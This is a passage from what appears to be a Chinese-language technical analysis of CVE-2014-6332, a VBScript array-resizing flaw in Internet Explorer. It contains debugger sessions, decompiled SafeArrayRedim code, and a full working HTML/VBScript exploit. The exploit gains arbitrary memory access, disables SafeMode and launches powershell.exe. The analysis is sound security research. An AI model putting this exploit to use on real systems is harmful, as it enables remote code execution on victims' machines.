0</span><br></pre></td></tr></table></figure><p>通过查看栈回溯观察第三个参数地址为<code>0x003dfb00</code>,而这个地址上存的其实是一个<code>VARIANT</code>类型。对比前面给出的<code>VARIANT</code>结构，可以看到其中<code>varType</code>为<code>0x600c</code>，查看前面<code>VARENUM</code>中的值，<code>0x600c</code>对应的类型其实是<code>VT_VARIANT|VT_ARRAY|VT_BYREF</code>,即当前<code>VARIANT</code>其实是一个数组引用，<code>0x01f87798</code>上存的是数组首地址的指针，而<code>0x0010d850</code>才是真正数组首地址值。其实看到<code>varType</code>类型为<code>0x600c</code>时，可以直接查看偏移<code>0xc</code>处的<code>DWORD</code>值，该值便是数组首地址。</p><p>将<code>0x0010d850</code>处值以<code>tagSAFEARRAY</code>结构展示，可以看到这是一个一维数组，数据存放在<code>0x000e5a28</code> <code>pvData</code>处，数组大小为<code>6</code>。</p><p>继续调试，我们在<code>vbscript!RedimPreserveArray</code>处下断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bu vbscript!RedimPreserveArray</span><br><span class="line">0:005&gt; bl</span><br><span class="line"> 0 e 6a2ec206     0001 (0001)  0:**** vbscript!VbsIsEmpty</span><br><span class="line"> 1 e 6a2e5891     0001 (0001)  0:**** vbscript!RedimPreserveArray</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 14:51:58.106 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=01f8778c ebx=024ad034 ecx=0010d850 edx=0000600c esi=01f8a3fd edi=00000000</span><br><span class="line">eip=6a2e5891 esp=024acee4 ebp=024acfdc iopl=0         nv up ei pl nz na po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</span><br><span class="line">vbscript!RedimPreserveArray:</span><br><span class="line">6a2e5891 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; gu</span><br><span class="line">Tue Jun 25 14:52:26.436 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=024ad034 ecx=6a32a9d8 edx=024acfac esi=01f8a088 edi=00000001</span><br><span class="line">eip=6a2ec206 esp=024acec8 ebp=024aced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure><p>此时断点是断在poc中的<code>redim Preserve arrayA(over)</code>语句。而变量<code>over</code>是一个很大的值<code>0x8000005</code>，系统在申请内存时不可能申请这么大的内存空间，但是由于存在<code>On Error Resume Next</code>语句，脚本会继续向下执行，因此在执行<code>gu</code>命令后程序会出错然后跳出<code>vbscript!RedimPreserveArray</code>函数，然后断在<code>vbscript!VbsIsEmpty</code>上。此时，我们再观察<code>arrayA</code>中的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 0010d850 l8</span><br><span class="line">0010d850  08800001 00000010 00000000 000e5a28</span><br><span class="line">0010d860  08000006 00000000 53aee65f 88000000</span><br><span class="line">0:005&gt; dt tagSAFEARRAYBOUND 0010d850 + 0x10</span><br><span class="line">UxTheme!tagSAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 0x8000006</span><br><span class="line">   +0x004 lLbound          : 0</span><br></pre></td></tr></table></figure><p>数组实际数据地址依然是<code>0x000e5a28</code>，但是数组大小却由原来的<code>0x6</code>变成了现在的<code>0x8000006</code>，而这个值就是poc中的<code>over</code>大小。</p><p>在 IDA 查看<code>oleaut32.dll</code>中负责实际内存调整的<code>SafeArrayRedim</code>函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __<span class="function">stdcall <span class="title">SafeArrayRedim</span><span class="params">(SAFEARRAY *psa, SAFEARRAYBOUND *psaboundNew)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SAFEARRAY *v2; <span class="comment">// esi@1</span></span><br><span class="line">  USHORT v3; <span class="comment">// cx@3</span></span><br><span class="line">  __int32 v4; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// ebx@6// 有符号的int类型</span></span><br><span class="line">  ULONG v6; <span class="comment">// ebx@9</span></span><br><span class="line">  LONG v7; <span class="comment">// edi@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// eax@9</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IMalloc</span> *<span class="title">v9</span>;</span> <span class="comment">// edi@11</span></span><br><span class="line">  SAFEARRAY *v10; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax@17</span></span><br><span class="line">  SAFEARRAYBOUND *v13; <span class="comment">// eax@38</span></span><br><span class="line">  ULONG v14; <span class="comment">// [sp+Ch] [bp-18h]@9</span></span><br><span class="line">  LONG v15; <span class="comment">// [sp+10h] [bp-14h]@9</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IMalloc</span> *<span class="title">v16</span>;</span> <span class="comment">// [sp+14h] [bp-10h]@6</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [sp+18h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+1Ch] [bp-8h]@9</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [sp+20h] [bp-4h]@7//</span></span><br><span class="line">  SAFEARRAY *psaa; <span class="comment">// [sp+2Ch] [bp+8h]@6</span></span><br><span class="line">  SAFEARRAYBOUND *psaboundNewa; <span class="comment">// [sp+30h] [bp+Ch]@38</span></span><br><span class="line"></span><br><span class="line">  v2 = psa;<span class="comment">// 待调整数组的指针</span></span><br><span class="line">  <span class="keyword">if</span> ( psa )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( psaboundNew )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = psa-&gt;fFeatures;</span><br><span class="line">      v17 = psa-&gt;fFeatures &amp; <span class="number">0x2000</span>; <span class="comment">// FADF_FIXEDSIZE</span></span><br><span class="line">      <span class="keyword">if</span> ( psa-&gt;cDims )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( psa-&gt;cLocks &gt; <span class="number">0</span> || v3 &amp; <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-2147352563</span>;</span><br><span class="line">        psaa = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v4 = GetMalloc(&amp;v16);</span><br><span class="line">        v5 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &amp;&amp; v4 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v5;</span><br><span class="line">        Size = SafeArraySize(v2);<span class="comment">// 获取原始数组大小</span></span><br><span class="line">        <span class="keyword">if</span> ( !Size || v2-&gt;pvData )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v2-&gt;rgsabound[<span class="number">0</span>].cElements;<span class="comment">// 原始数组元素个数</span></span><br><span class="line">          v7 = v2-&gt;rgsabound[<span class="number">0</span>].lLbound;</span><br><span class="line">          v2-&gt;rgsabound[<span class="number">0</span>] = *psaboundNew;<span class="comment">// 新的数组 SAFEARRAYBOUND 替换原来的</span></span><br><span class="line">          v14 = v6;</span><br><span class="line">          v15 = v7;</span><br><span class="line">          v8 = SafeArraySize(v2);</span><br><span class="line">          v18 = v8;</span><br><span class="line">          <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )<span class="comment">// 验证是否替换成功，失败则还原</span></span><br><span class="line">          &#123;</span><br><span class="line">            v2-&gt;rgsabound[<span class="number">0</span>].cElements = v6;</span><br><span class="line">            v2-&gt;rgsabound[<span class="number">0</span>].lLbound = v7;</span><br><span class="line">            v5 = <span class="number">-2147024882</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v5 = v8 - Size;<span class="comment">// 计算数组大小改动的差值</span></span><br><span class="line">            <span class="keyword">if</span> ( v8 != Size )</span><br><span class="line">            &#123;</span><br><span class="line">              v9 = v16;</span><br><span class="line">              <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> &amp;&amp; v2-&gt;fFeatures &amp; <span class="number">0xF20</span> )<span class="comment">// v5是有符号数，只有值大于0x8000000则恒小于0</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  psaa = (SAFEARRAY *)((<span class="keyword">char</span> *)v2-&gt;pvData + v8);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v10 = (SAFEARRAY *)v16-&gt;lpVtbl-&gt;Alloc(v16, -v5);</span><br><span class="line">                  psaa = v10;</span><br><span class="line">                  <span class="keyword">if</span> ( !v10 )<span class="comment">// 如果内存分配失败，直接返回，没有将数组大小还原</span></span><br><span class="line">                    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">                  <span class="built_in">memcpy</span>(v10, (<span class="keyword">char</span> *)v2-&gt;pvData + v18, -v5);</span><br><span class="line">                  v8 = v18;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v17 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v8 &lt;= Size )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">                v13 = (SAFEARRAYBOUND *)v9-&gt;lpVtbl-&gt;Alloc(v9, v8);</span><br><span class="line">                psaboundNewa = v13;</span><br><span class="line">                <span class="keyword">if</span> ( v13 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">memcpy</span>(v13, v2-&gt;pvData, Size);</span><br><span class="line">                  v2-&gt;pvData = psaboundNewa;</span><br><span class="line">                  v2-&gt;fFeatures &amp;= <span class="number">0xDFFF</span>u;</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v11 = (<span class="keyword">int</span>)v9-&gt;lpVtbl-&gt;Realloc(v9, v2-&gt;pvData, v8);</span><br><span class="line">                <span class="keyword">if</span> ( v11 )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">                  v2-&gt;pvData = (PVOID)v11;</span><br><span class="line">LABEL_19:</span><br><span class="line">                  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">memset</span>((<span class="keyword">char</span> *)v2-&gt;pvData + Size, <span class="number">0</span>, v5);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( psaa )</span><br><span class="line">                      ReleaseResources(v2, (VARIANTARG *)psaa, -v5, v2-&gt;fFeatures, v2-&gt;cbElements);</span><br><span class="line">                    <span class="keyword">if</span> ( v17 )</span><br><span class="line">                      psaa = <span class="number">0</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v5 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v18 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v11 = (<span class="keyword">int</span>)v9-&gt;lpVtbl-&gt;Alloc(v9, <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              v2-&gt;rgsabound[<span class="number">0</span>].cElements = v14;</span><br><span class="line">              v2-&gt;rgsabound[<span class="number">0</span>].lLbound = v15;</span><br><span class="line">LABEL_32:</span><br><span class="line">              v5 = <span class="number">-2147024882</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">              <span class="keyword">if</span> ( psaa )</span><br><span class="line">                v9-&gt;lpVtbl-&gt;Free(v9, psaa);</span><br><span class="line">              <span class="keyword">return</span> v5;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> v5;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2147024809</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面代码中，可以看出该漏洞成因主要有两点：</p><ol><li>本身数组结构中的元素个数<code>cElements</code>字段为无符号类型，而在处理新旧数组元素个数的时候却使用了有符号数来保存差值。这就导致了当新旧数组的元素个数的差值相差大于了<code>0x8000000</code>时，上面代码中的<code>v5</code>会将最高位的<code>1</code>解释成符号位，从而使得<code>v5</code>恒小于<code>0</code>，在后面判断中进入了错误的分支。</li><li><code>SafeArrayRedim</code>在调整数组大小时，是先将<code>psaboundNew</code>结构赋值给<code>psa-&gt;rgsabound</code>，然后再去申请内存空间，但是如果内存申请失败，存在一个分支，会直接让函数返回而不对数组大小进行还原。使得原数组变成了一个超长数组，导致了任意地址的读写。</li></ol><h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>完整poc如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2014-6332 POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">dim   arrayA()</span><br><span class="line">dim   arrayB()</span><br><span class="line">dim   arraySize</span><br><span class="line">dim   overSize</span><br><span class="line">dim   index</span><br><span class="line">dim   myarray</span><br><span class="line"></span><br><span class="line">function Begin()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    BeginInit()</span><br><span class="line"></span><br><span class="line">    If CreateArray() = True Then</span><br><span class="line">        Trigger()</span><br><span class="line">    end if</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function BeginInit()</span><br><span class="line">    Randomize()</span><br><span class="line">    redim arrayA(2)</span><br><span class="line">    redim arrayB(2)</span><br><span class="line">    arraySize = 5</span><br><span class="line">    index = 2</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function readMemory(addr)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    arrayA(arraySize + 2) = addr + 4</span><br><span class="line">    arrayB(0) = 1.69759663316747E-313</span><br><span class="line">    readMemory = lenb(arrayA(arraySize + 2))</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function RunWin32Exe()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    set shell=createobject("Shell.Application")</span><br><span class="line">    shell.ShellExecute "powershell.exe"</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function Trigger()</span><br><span class="line">    On Error Resume Next</span><br><span class="line"></span><br><span class="line">    pCScriptEntryPoint = setCScriptEntryPoint()</span><br><span class="line"></span><br><span class="line">    pAddr = readMemory(pCScriptEntryPoint + 8)</span><br><span class="line">    pAddr = readMemory(pAddr + 16)</span><br><span class="line"></span><br><span class="line">    for offset = 0 to &amp;h60 step 4</span><br><span class="line">        progId = readMemory(pAddr + &amp;h120 + offset)</span><br><span class="line">        if(progId = 14) then</span><br><span class="line">            redim  Preserve arrayA(overSize)</span><br><span class="line">            arrayA(arraySize + 4)(pAddr + &amp;h11c + offset) = arrayB(4)</span><br><span class="line">            redim  Preserve arrayA(arraySize)</span><br><span class="line">            Exit for</span><br><span class="line">        end if</span><br><span class="line">    next</span><br><span class="line">    RunWin32Exe()</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">sub testfunc()</span><br><span class="line">end sub</span><br><span class="line"></span><br><span class="line">function setCScriptEntryPoint()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    myarray = chrw(01)&amp;chrw(2176)&amp;chrw(01)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)</span><br><span class="line">    myarray = myarray&amp;chrw(00)&amp;chrw(32767)&amp;chrw(00)&amp;chrw(0)</span><br><span class="line"></span><br><span class="line">    pScriptEntryPoint = testfunc</span><br><span class="line">    pScriptEntryPoint = null</span><br><span class="line">    Msgbox "waiting for debug"</span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line">    IsEmpty(arrayB)</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayB(0) = 0</span><br><span class="line">    arrayA(arraySize + 2) = pScriptEntryPoint</span><br><span class="line">    arrayB(0) = 6.36598737437801E-314</span><br><span class="line">    arrayA(arraySize + 4) = myarray</span><br><span class="line">    arrayB(2) = 1.74088534731324E-310</span><br><span class="line">    setCScriptEntryPoint = arrayA(arraySize + 2)</span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function Over()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim type1</span><br><span class="line">    Over = False</span><br><span class="line"></span><br><span class="line">    arraySize = arraySize + index</span><br><span class="line">    overSize = arraySize + &amp;h8000000</span><br><span class="line"></span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">    redim  arrayB(arraySize)</span><br><span class="line">    redim  Preserve arrayA(overSize)</span><br><span class="line">    arrayA(arraySize) = 10</span><br><span class="line">    arrayB(0) = 1.123456789012345678901234567890</span><br><span class="line">    type1 = 1</span><br><span class="line"></span><br><span class="line">    If (IsObject(arrayA(arraySize + 1)) = False) Then</span><br><span class="line"><span class="xml">        if(vartype(arrayA(arraySize + 1)) <span class="tag">&lt;&gt;</span> 0) Then</span></span><br><span class="line">            If(IsObject(arrayA(arraySize + 2)) = False ) Then</span><br><span class="line">                type1=VarType(arrayA(arraySize + 2))</span><br><span class="line">           end if</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">    If(type1=&amp;h2f66) Then</span><br><span class="line">        Over = True</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    redim  Preserve arrayA(arraySize)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">function CreateArray()</span><br><span class="line">  On Error Resume Next</span><br><span class="line">  dim i</span><br><span class="line">  CreateArray = False</span><br><span class="line"></span><br><span class="line">  For i = 0 To 400</span><br><span class="line">    If Over() = True Then</span><br><span class="line">       CreateArray = True</span><br><span class="line">       Exit For</span><br><span class="line">    End If</span><br><span class="line">  Next</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">Begin()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 下面是poc中用到的浮点数在内存中的表现形式,转换很简单，使用 python 的 struct: struct.pack(<span class="string">'&gt;d'</span>, n).encode(<span class="string">'hex'</span>)</span><br><span class="line">1.123456789012345678901234567890 =&gt; 0x3ff1f9add3746f66</span><br><span class="line">1.69759663316747E-313  =&gt;  0x0000000800000008</span><br><span class="line">6.36598737437801E-314  =&gt;  0x0000000300000003</span><br><span class="line">1.74088534731324E-310  =&gt;  0x0000200c0000200c</span><br></pre></td></tr></table></figure><p>整个poc执行流程如下：</p><ol><li>初始数组<code>arrayA</code>, <code>arrayB</code>。</li><li>通过循环<code>redim</code> 使得<code>arrayA</code>和<code>arrayB</code>的<code>pvData</code>空间连续(中间相差一个heap指针)。(<code>CreateArray</code>函数)</li><li>通过定义函数指针赋给变量的方法获取获取<code>CScriptEntryPoint</code>对象地址,从而找到<code>COleScript</code>对象，然后利用漏洞将伪造的数组结构<code>myarray</code>布局到内存中，使得成功访问到<code>SafeMode</code>并修改其属性值为<code>0</code>，此时已开始上帝模式。(<code>Trigger</code>函数)</li><li>执行自定义的命令。(<code>RunWin32Exe</code>函数)</li></ol><h4 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h4><p>调试poc，在<code>vbscript!VbsIsEmpty</code>处断点进行调试:</p><p><img src="/media/cve-2014-6332/memory-layout.png" alt="memory-layout"></p><p>调试可以发现，<code>arrayA</code>和<code>arrayB</code>两者的实际数据存储地址只相差8个字节，通过<code>arrayA</code>的越界读，可以使得<code>arrayB</code>的数据能够控制<code>arrayA</code>元素的类型。</p><p>而达到需要的内存布局则是通过不断循环<code>redim</code>修改数组来的。数值<code>1.123456789012345678901234567890</code>保存在<code>arrayB(0)</code>中，<code>VARIANT</code>结构的<code>Type</code>为5，值为<code>0x3ff1f9add3746f66</code>,此时访问<code>arrayA(arraySize + 1)</code>, <code>arrayB(0)</code>的 <code>Data High</code> + <code>Data Low</code> 部分会被当成 <code>arrayA(arraySize+1)</code> 的 <code>Type</code> + <code>Reserved</code> 部分，即<code>VarType(arrayA(arraySize+1)) == 0x2f66</code>. (上图中实际<code>Type</code>值是<code>0x6f66</code>, 但是<code>VarType</code>求出来的值是 <code>0x2f66</code>,因为 <code>VbsVarType</code> 中实现是 <code>return *(_WORD *)VAR::PvarGetVarVal(a1, 1) &amp; 0xBFFF</code>; 即少了 <code>0x4000</code>,去掉了引用属性。)</p><h4 id="获取-CScriptEntryPoint对象指针"><a href="#获取-CScriptEntryPoint对象指针" class="headerlink" title="获取 CScriptEntryPoint对象指针"></a>获取 <code>CScriptEntryPoint</code>对象指针</h4><p>继续上面的调试，我们在<code>vbscript!AssignVar</code>处下断点，第一次执行会断在<code>arrayB(0)=0</code>处，继续执行，第二次则会断在<code>arrayA(arraySize + 2) = pScriptEntryPoint</code>处，观察数组中的值：</p><p><img src="/media/cve-2014-6332/assign-func.png" alt="assign-func"></p><p>此时<code>arrayA(arraySize+2)</code>中存放的就是<code>CScriptEntryPoint</code>对象指针，但是由于其类型为<code>VT_NULL</code>无法读出其值。所以需要通过内存错位进行修改。poc中<code>arrayB(0) = 